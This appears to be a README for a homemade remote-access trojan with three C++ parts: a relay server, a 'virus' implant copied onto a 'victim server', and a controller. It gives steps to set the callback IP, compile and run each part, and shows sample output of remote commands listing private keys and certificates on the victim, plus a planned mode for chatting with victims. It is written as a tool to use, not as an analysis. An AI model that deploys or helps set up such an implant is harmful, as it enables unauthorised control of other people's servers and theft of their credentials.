Linux Server only. Different version of Linux may rely on different .so files to link, thus I don't put certain version of executable here, please compile these 3 code manually

Step 1: Replace the ip address "192.168.80.132" in the tcsl.cpp and host.cpp


Step 2: Copy all the codes, tcsl.cpp to your Linux Server, virus.cpp to your victim server, host.cpp to your local machine as control side, and then compile:

g++ tcsl.cpp -o tcsl 
g++ host.cpp -o host 
g++ virus.cpp -o server 

Step 3: Open 3 terminals and run the command seperately:
./tcsl
And then you can run any amounts of Clients or Host with newly open up terminal
the Host is config as the last connected, after the server has been opened, you can lauch the host or client first either way
./virus
./host

Step 4: Enjoy your commands in the host terminal, it would reply the result send by you, for example:

┌──(root㉿kali)-[/home/kali/Desktop]

└─# ./host              
Connected to the server.

┌──(root♪hr0g) - [~]

└─# ls 1
ca.crt
ca.key
dh.pem
ha.crt
ha.key
hr0g.crt
hr0g.key
server.conf

┌──(root♪hr0g) - [~]

└─# 

use 'chatmode' to communicate with victims(under development)
